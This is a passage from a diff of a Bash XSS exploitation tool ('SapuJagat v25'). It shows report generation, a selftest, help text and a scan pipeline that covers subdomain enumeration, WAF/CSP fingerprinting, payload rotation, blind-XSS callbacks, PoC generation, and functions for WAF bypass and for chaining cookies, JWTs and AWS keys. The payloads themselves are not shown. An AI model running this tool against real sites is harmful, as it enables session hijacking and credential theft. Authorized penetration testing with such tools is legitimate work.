+        echo "# SapuJagat v25 XSS EXPLOIT Report"
+        echo "**Author:** BimaKesengsaraan · Karya anak bangsa  "
+        echo "**Generated:** $ts  "
+        echo "**Target:** ${TARGET:-$URL_LIST}  "
+        echo "**WAF:** $WAF_TYPE  "
+        echo "**CSP:** $CSP_MODE  "
+        echo "**Tech:** ${TECH_STACK:-unknown}  "
+        echo "**Callback:** ${CALLBACK_URL:-none}  "
+        echo ""
+        echo "## Stats"
+        echo "- URLs: $STAT_URLS"
+        echo "- Params: $STAT_PARAMS"
+        echo "- Payloads: $STAT_PAYLOADS"
+        echo "- Findings: $total (critical: $critical)"
+        echo "- Verified: $verified"
+        echo "- FP filtered: $STAT_FP_FILTERED"
+        echo ""
+        echo "## Findings"
+        echo '```'
+        cat "$VULN_LOG" 2>/dev/null || echo "No findings."
+        echo '```'
+    } > "${base}.md"
+
+    {
+        cat <<'HTML'
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>SapuJagat v25 Report — BimaKesengsaraan</title>
+<style>
+body{font-family:ui-monospace,monospace;background:#0a0a0a;color:#e0e0e0;padding:2em;max-width:1200px;margin:auto;line-height:1.5}
+h1{color:#f33;border-bottom:2px solid #f33;padding-bottom:.3em}
+h2{color:#fa0;border-bottom:1px solid #333;padding-bottom:.3em;margin-top:2em}
+.finding{border-left:4px solid #8c8;padding:1em;margin:1em 0;background:#161616;border-radius:4px}
+.crit{border-color:#f33;background:#1a0a0a}.high{border-color:#f60}.med{border-color:#fa0}.low{border-color:#8c8}
+code{color:#6cf;word-break:break-all;background:#222;padding:2px 4px;border-radius:3px}
+.cvss{background:#222;padding:2px 6px;border-radius:3px;font-size:.85em}
+.impact{background:#1a0a0a;color:#f33;padding:2px 8px;border-radius:3px;font-weight:bold}
+.verified{background:#0a3a0a;color:#0f0;padding:2px 8px;border-radius:3px;font-weight:bold;display:inline-block;margin:.3em 0}
+.meta{color:#888;font-size:.9em}
+.warn{color:#fa0;padding:1em;background:#1a1a00;border-left:3px solid #fa0}
+.stat{display:inline-block;padding:.5em 1em;background:#222;margin:.3em;border-radius:4px}
+.footer{color:#666;font-size:.85em;text-align:center;margin-top:3em;padding-top:1em;border-top:1px solid #333}
+</style></head><body>
+HTML
+        echo "<h1>SapuJagat v25 XSS EXPLOIT Report</h1>"
+        echo "<p class=\"meta\"><b>Author:</b> BimaKesengsaraan · Karya anak bangsa<br>"
+        echo "<b>Generated:</b> $ts<br><b>Target:</b> ${TARGET:-$URL_LIST}<br>"
+        echo "<b>WAF:</b> $WAF_TYPE | <b>CSP:</b> $CSP_MODE | <b>Tech:</b> ${TECH_STACK:-unknown}</p>"
+        echo "<h2>Stats</h2>"
+        echo "<div class=\"stat\">URLs: <b>$STAT_URLS</b></div>"
+        echo "<div class=\"stat\">Params: <b>$STAT_PARAMS</b></div>"
+        echo "<div class=\"stat\">Payloads: <b>$STAT_PAYLOADS</b></div>"
+        echo "<div class=\"stat\">Findings: <b>$total</b></div>"
+        echo "<div class=\"stat\">Critical: <b>$critical</b></div>"
+        echo "<div class=\"stat\">Verified: <b>$verified</b></div>"
+
+        if [[ -s "$JSON_LOG" ]] && (( total > 0 )); then
+            for sev in critical high medium low; do
+                local cls="low"
+                [[ "$sev" == "critical" ]] && cls="crit"
+                [[ "$sev" == "high" ]] && cls="high"
+                [[ "$sev" == "medium" ]] && cls="med"
+                local count; count=$(jq --arg s "$sev" '[.[]|select(.severity==$s)]|length' "$JSON_LOG")
+                (( count == 0 )) && continue
+                echo "<h2>$sev ($count)</h2>"
+                jq -r --arg s "$sev" --arg cls "$cls" '.[] | select(.severity==$s) |
+                    "<div class=\"finding \($cls)\"><b>\(.param)</b> @ <code>\(.url)</code><br>"
+                    + "<span class=\"impact\">\(.impact)</span> <span class=\"cvss\">CVSS \(.cvss_score)</span><br>"
+                    + "Payload: <code>\(.payload)</code><br>"
+                    + "Verified: <b>\(.verified)</b> | Context: \(.context) | Conf: \(.confidence)<br>"
+                    + (if .verified_impact != "" and .verified_impact != null then "<div class=\"verified\">✅ \(.verified_impact)</div><br>" else "" end)
+                    + "<span class=\"meta\">PoC: <code>\(.poc)</code></span>"
+                    + "</div>"' "$JSON_LOG"
+            done
+        else
+            echo "<div class=\"warn\">Tidak ada finding.</div>"
+        fi
+        echo "<div class=\"footer\">SapuJagat v25 by BimaKesengsaraan · Karya anak bangsa</div>"
+        echo '</body></html>'
+    } > "${base}.html"
+
+    ok "Report: ${base}.html"
+    ok "Report: ${base}.md"
+    ok "JSON  : $JSON_LOG"
+    ok "Raw   : $VULN_LOG"
+    generate_poc_scripts "$JSON_LOG"
+}
+
+# ════════════════════════════════════════════════════════════
+#  SELFTEST
+# ════════════════════════════════════════════════════════════
+selftest() {
+    echo ""
+    echo -e "${M}   Selftest v$VERSION${NC}"
+    echo ""
+    local pass=0 fail=0
+    _t() {
+        local name="$1"; shift
+        printf "   %-42s " "$name"
+        if "$@" &>/dev/null; then echo -e "${G}✓${NC}"; pass=$((pass+1))
+        else echo -e "${R}✗${NC}"; fail=$((fail+1)); fi
+    }
+    _t "curl" command -v curl
+    _t "jq" command -v jq
+    _t "python3" command -v python3
+    _t "fn build_url" declare -F build_url
+    _t "fn analyze_filter" declare -F analyze_filter
+    _t "fn detect_context_at_marker" declare -F detect_context_at_marker
+    _t "fn select_payloads_by_context" declare -F select_payloads_by_context
+    _t "fn mutate_payload" declare -F mutate_payload
+    _t "fn payloads_body" declare -F payloads_body
+    _t "fn payloads_attr_dq" declare -F payloads_attr_dq
+    _t "fn payloads_script" declare -F payloads_script
+    _t "fn detect_csp" declare -F detect_csp
+    _t "fn csp_confidence_adjust" declare -F csp_confidence_adjust
+    _t "fn waf_header_bypass" declare -F waf_header_bypass
+    _t "fn dom_scan" declare -F dom_scan
+    _t "fn record_finding" declare -F record_finding
+    _t "fn manual_scan" declare -F manual_scan
+    _t "fn crawl_all" declare -F crawl_all
+    _t "fn generate_reports" declare -F generate_reports
+    _t "fn chain_cookie_replay" declare -F chain_cookie_replay
+    _t "fn chain_jwt_decode" declare -F chain_jwt_decode
+    _t "fn chain_aws_key" declare -F chain_aws_key
+    echo ""
+    echo -e "   ${G}PASS${NC}: $pass  ${R}FAIL${NC}: $fail"
+    echo ""
+    (( fail == 0 )) && return 0 || return 1
+}
+
+# ════════════════════════════════════════════════════════════
+#  HELP
+# ════════════════════════════════════════════════════════════
+help_full() {
+    BANNER
+    cat <<EOF
+${W}  USAGE${NC}
+     sapujagat scan -d DOMAIN  [flags]
+     sapujagat scan -u URL     [flags]
+     sapujagat scan -l FILE    [flags]
+     sapujagat selftest
+
+${W}  TARGET${NC}
+     -d DOMAIN       scan domain
+     -u URL          scan single URL
+     -l FILE         scan dari file
+
+${W}  EXPLOIT FLAGS${NC}
+     --blind URL|auto    blind XSS callback
+     --dom               DOM XSS (Playwright)
+     --rotation N        payload rotation (default 12)
+     --no-csp            skip CSP detect
+     --no-stored         skip stored verify
+     --no-verify         skip impact verify
+     --no-bypass         skip WAF bypass
+     --no-impact         skip impact payload
+
+${W}  OTHER${NC}
+     --deep          crawl dalam
+     --fast          skip discovery
+     --no-crawl      skip crawl
+     --no-discovery  skip discovery
+     --no-subenum    skip subdomain enum
+     --cookie "..."  cookie session
+     --proxy URL     proxy
+     --max-urls N    cap URL
+     --verbose|-v    detail
+     --quiet|-q      ringkas
+     --dry-run       simulasi
+     -o NAME         prefix output
+     -h, --help      bantuan
+
+${W}  CONTOH${NC}
+     sapujagat scan -u 'http://127.0.0.1:5000/reflected?q=test' --fast --no-crawl --no-discovery
+     sapujagat scan -d target.com --blind auto
+     sapujagat scan -u 'https://t.com/?q=x' --cookie "sess=abc"
+     sapujagat scan -l urls.txt --rotation 20
+
+${M}  ═══════════════════════════════════════════════════════════════════${NC}
+${D}  SapuJagat v$VERSION · MIT · Karya anak bangsa${NC}
+${D}  by BimaKesengsaraan${NC}
+${M}  ═══════════════════════════════════════════════════════════════════${NC}
+EOF
+}
+
+# ════════════════════════════════════════════════════════════
+#  MAIN
+# ════════════════════════════════════════════════════════════
+main() {
+    local cmd="${1:-}"
+    case "$cmd" in
+        version|--version) echo "$VERSION"; exit 0 ;;
+        ""|-h|--help|help) help_full; exit 0 ;;
+        selftest|--selftest) selftest; exit $? ;;
+        scan) shift ;;
+        *) help_full; exit 1 ;;
+    esac
+
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            -d|--domain) INPUT_MODE="domain"; TARGET="$2"; DOMAIN=$(detect_domain "$TARGET"); shift 2 ;;
+            -u|--url) INPUT_MODE="url"; TARGET="$2"; DOMAIN=$(detect_domain "$TARGET"); shift 2 ;;
+            -l|--list) INPUT_MODE="list"; URL_LIST="$2"; [[ -f "$URL_LIST" ]] || { err "File gak ada"; exit 1; }; DOMAIN=$(detect_domain "$URL_LIST"); shift 2 ;;
+            *) break ;;
+        esac
+    done
+
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --deep) MODE="deep"; shift ;;
+            --fast) MODE="fast"; DO_DISCOVERY=0; shift ;;
+            --no-crawl) DO_CRAWL=0; shift ;;
+            --no-discovery) DO_DISCOVERY=0; shift ;;
+            --no-subenum) SKIP_SUBENUM=1; shift ;;
+            --no-bypass) AUTO_BYPASS=0; shift ;;
+            --no-tech) TECH_PAYLOAD=0; shift ;;
+            --no-impact) IMPACT_PAYLOAD=0; shift ;;
+            --no-verify) VERIFY_IMPACT=0; shift ;;
+            --no-csp) CSP_DETECT=0; shift ;;
+            --no-stored) STORED_VERIFY=0; shift ;;
+            --dom) DOM_SCAN=1; shift ;;
+            --rotation) MAX_ROTATION="$2"; shift 2 ;;
+            --blind|--callback) CALLBACK_URL="$2"; DO_CALLBACK=1; shift 2 ;;
+            --cookie) COOKIE="$2"; shift 2 ;;
+            --proxy) PROXY="$2"; shift 2 ;;
+            --max-urls) MAX_URLS="$2"; shift 2 ;;
+            --verbose|-v) VERBOSE=1; shift ;;
+            --quiet|-q) QUIET=1; shift ;;
+            --dry-run) DRY_RUN=1; shift ;;
+            -o|--output) OUTDIR_BASE="$2"; shift 2 ;;
+            -h|--help) help_full; exit 0 ;;
+            *) warn "Unknown flag: $1"; shift ;;
+        esac
+    done
+
+    [[ -z "$INPUT_MODE" ]] && { err "Kasih -d, -u, atau -l"; help_full; exit 1; }
+
+    detect_env
+    log_init
+
+    CHAIN_LOG="$OUTDIR/chains.json"
+    echo '[]' > "$CHAIN_LOG"
+
+    BANNER
+    box_title "SCAN START"
+    kv "Mode"     "$INPUT_MODE"
+    kv "Target"   "${TARGET:-$URL_LIST}"
+    kv "Domain"   "${DOMAIN:-N/A}"
+    kv "Rotation" "$MAX_ROTATION"
+    kv "CSP"      "$([[ $CSP_DETECT == 1 ]] && echo 'on' || echo 'off')"
+    kv "Verify"   "$([[ $VERIFY_IMPACT == 1 ]] && echo 'on' || echo 'off')"
+    kv "Callback" "$([[ -n "$CALLBACK_URL" ]] && echo "$CALLBACK_URL" || echo 'none')"
+    kv "Output"   "$OUTDIR"
+    echo ""
+
+    local miss=()
+    for c in curl jq python3; do command -v "$c" &>/dev/null || miss+=("$c"); done
+    [[ ${#miss[@]} -gt 0 ]] && { err "Missing: ${miss[*]}"; exit 1; }
+
+    if [[ -n "$DOMAIN" ]]; then
+        local code; code=$(curl -sk -o /dev/null -w '%{http_code}' --connect-timeout 5 "https://$DOMAIN" 2>/dev/null || echo "000")
+        case "$code" in
+            000) warn "$DOMAIN unreachable" ;;
+            200|301|302|401|403) ok "Target reachable ($code)" ;;
+        esac
+    fi
+
+    callback_setup
+
+    local total_phases=6
+    local cur=0
+
+    if [[ "$INPUT_MODE" == "domain" && "$SKIP_SUBENUM" == "0" ]]; then
+        cur=$((cur+1))
+        phase_tag "$cur" "$total_phases" "Subdomain Enum"
+        enum_subdomains "$TARGET"
+        phase_end
+    fi
+
+    if [[ "$INPUT_MODE" == "domain" || "$INPUT_MODE" == "list" ]]; then
+        cur=$((cur+1))
+        phase_tag "$cur" "$total_phases" "Crawl"
+        if (( DO_CRAWL == 1 )); then
+            crawl_all "$TARGET" "$URL_LIST"
+        else
+            : > "$OUTDIR/urls/targets.txt"
+            [[ -n "$URL_LIST" && -f "$URL_LIST" ]] && head -50 "$URL_LIST" > "$OUTDIR/urls/targets.txt"
+            [[ -z "$URL_LIST" && -n "$DOMAIN" ]] && echo "https://$DOMAIN/?q=test" > "$OUTDIR/urls/targets.txt"
+            STAT_URLS=$(wc -l < "$OUTDIR/urls/targets.txt" 2>/dev/null || echo 0)
+            ok "Crawl skipped — $STAT_URLS"
+        fi
+        phase_end
+    fi
+
+    if [[ "$INPUT_MODE" == "url" ]]; then
+        cur=$((cur+1))
+        phase_tag "$cur" "$total_phases" "URL Auto-Detect"
+        auto_detect_url "$TARGET"
+        phase_end
+    fi
+
+    if (( DO_DISCOVERY == 1 )); then
+        cur=$((cur+1))
+        phase_tag "$cur" "$total_phases" "Discovery"
+        [[ -n "$DOMAIN" ]] && path_discovery "$DOMAIN" 2>/dev/null || true
+        fingerprint_stack "$OUTDIR/urls/targets.txt" 2>/dev/null || true
+        phase_end
+    fi
+
+    cur=$((cur+1))
+    phase_tag "$cur" "$total_phases" "WAF + CSP"
+    fingerprint_waf "$OUTDIR/urls/targets.txt"
+    detect_csp "$OUTDIR/urls/targets.txt" 2>/dev/null || true
+    phase_end
+
+    cur=$((cur+1))
+    phase_tag "$cur" "$total_phases" "Exploit (rotation $MAX_ROTATION)"
+    manual_scan "$OUTDIR/urls/targets.txt"
+    phase_end
+
+    cur=$((cur+1))
+    phase_tag "$cur" "$total_phases" "Report"
+    [[ -n "$CALLBACK_URL" ]] && blind_xss_scan "$OUTDIR/urls/targets.txt"
+    generate_reports
+    phase_end
+
+    local total crit verified_count
+    total=$(jq 'length' "$JSON_LOG" 2>/dev/null || echo 0)
+    crit=$(jq '[.[]|select(.severity=="critical")]|length' "$JSON_LOG" 2>/dev/null || echo 0)
+    verified_count=$(jq '[.[]|select(.verified_impact != null and .verified_impact != "")]|length' "$JSON_LOG" 2>/dev/null || echo 0)
+
+    box_title "SCAN COMPLETE"
+    kv "Findings"     "$total"
+    kv "Critical"     "$crit"
+    kv "Verified"     "$verified_count"
+    kv "Params"       "$STAT_PARAMS"
+    kv "Payloads"     "$STAT_PAYLOADS"
+    kv "FP filtered"  "$STAT_FP_FILTERED"
+    kv "CSP"          "$CSP_MODE"
+    kv "WAF"          "$WAF_TYPE"
+    kv "Report"       "$OUTDIR/laporan.html"
+    kv "PoC"          "$OUTDIR/exploits/"
+    echo ""
+    echo -e "   ${D}by BimaKesengsaraan · Karya anak bangsa${NC}"
+    echo ""
+
+    interactsh_stop 2>/dev/null || true
+}
+
+main "$@"
